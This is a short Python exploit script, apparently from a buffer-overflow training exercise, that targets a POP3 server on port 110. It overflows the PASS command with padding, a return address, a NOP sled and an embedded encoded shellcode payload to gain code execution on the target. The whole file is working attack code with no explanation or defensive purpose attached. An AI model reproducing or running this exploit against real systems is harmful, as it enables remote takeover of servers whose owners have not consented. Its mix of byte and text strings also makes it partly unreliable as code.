#! /usr/bin/python

import socket
import sys

if len(sys.argv) != 2:
    print("[-] usage: fuzz.py <ip address>")
    exit()


buf =  b""
buf += b"\xdb\xcf\xb8\x2e\x9b\xaf\x95\xd9\x74\x24\xf4\x5a\x29"
buf += b"\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\x6c\x88\x4d"
buf += b"\x60\x8c\x46\x13\x8b\x6c\x97\x74\x05\x89\xa6\xb4\x71"
buf += b"\xda\x99\x04\xf1\x8e\x15\xee\x57\x3a\xad\x82\x7f\x4d"
buf += b"\x06\x28\xa6\x60\x97\x01\x9a\xe3\x1b\x58\xcf\xc3\x22"
buf += b"\x93\x02\x02\x62\xce\xef\x56\x3b\x84\x42\x46\x48\xd0"
buf += b"\x5e\xed\x02\xf4\xe6\x12\xd2\xf7\xc7\x85\x68\xae\xc7"
buf += b"\x24\xbc\xda\x41\x3e\xa1\xe7\x18\xb5\x11\x93\x9a\x1f"
buf += b"\x68\x5c\x30\x5e\x44\xaf\x48\xa7\x63\x50\x3f\xd1\x97"
buf += b"\xed\x38\x26\xe5\x29\xcc\xbc\x4d\xb9\x76\x18\x6f\x6e"
buf += b"\xe0\xeb\x63\xdb\x66\xb3\x67\xda\xab\xc8\x9c\x57\x4a"
buf += b"\x1e\x15\x23\x69\xba\x7d\xf7\x10\x9b\xdb\x56\x2c\xfb"
buf += b"\x83\x07\x88\x70\x29\x53\xa1\xdb\x26\x90\x88\xe3\xb6"
buf += b"\xbe\x9b\x90\x84\x61\x30\x3e\xa5\xea\x9e\xb9\xca\xc0"
buf += b"\x67\x55\x35\xeb\x97\x7c\xf2\xbf\xc7\x16\xd3\xbf\x83"
buf += b"\xe6\xdc\x15\x03\xb6\x72\xc6\xe4\x66\x33\xb6\x8c\x6c"
buf += b"\xbc\xe9\xad\x8f\x16\x82\x44\x6a\xf1\x6d\x30\x75\x79"
buf += b"\x06\x43\x75\x78\x6d\xca\x93\x10\x81\x9b\x0c\x8d\x38"
buf += b"\x86\xc6\x2c\xc4\x1c\xa3\x6f\x4e\x93\x54\x21\xa7\xde"
buf += b"\x46\xd6\x47\x95\x34\x71\x57\x03\x50\x1d\xca\xc8\xa0"
buf += b"\x68\xf7\x46\xf7\x3d\xc9\x9e\x9d\xd3\x70\x09\x83\x29"
buf += b"\xe4\x72\x07\xf6\xd5\x7d\x86\x7b\x61\x5a\x98\x45\x6a"
buf += b"\xe6\xcc\x19\x3d\xb0\xba\xdf\x97\x72\x14\xb6\x44\xdd"
buf += b"\xf0\x4f\xa7\xde\x86\x4f\xe2\xa8\x66\xe1\x5b\xed\x99"
buf += b"\xce\x0b\xf9\xe2\x32\xac\x06\x39\xf7\xdc\x4c\x63\x5e"
buf += b"\x75\x09\xf6\xe2\x18\xaa\x2d\x20\x25\x29\xc7\xd9\xd2"
buf += b"\x31\xa2\xdc\x9f\xf5\x5f\xad\xb0\x93\x5f\x02\xb0\xb1"

_host = str(sys.argv[1].strip())
_port = 110
_buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 + buf + "\x90" * 16 + "C"*17

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print("[+] Connecting")
    s.connect((_host, _port))
    banner = s.recv(1024)
    print(banner)

    s.send("USER test \r\n")
    data = s.recv(1024)
    print(data)

    s.send("PASS "+ _buffer +"\r\n")
    data = s.recv(1024)
    print(data)

except:
    print("[-] Cannot connect to POP3 Server")
    exit()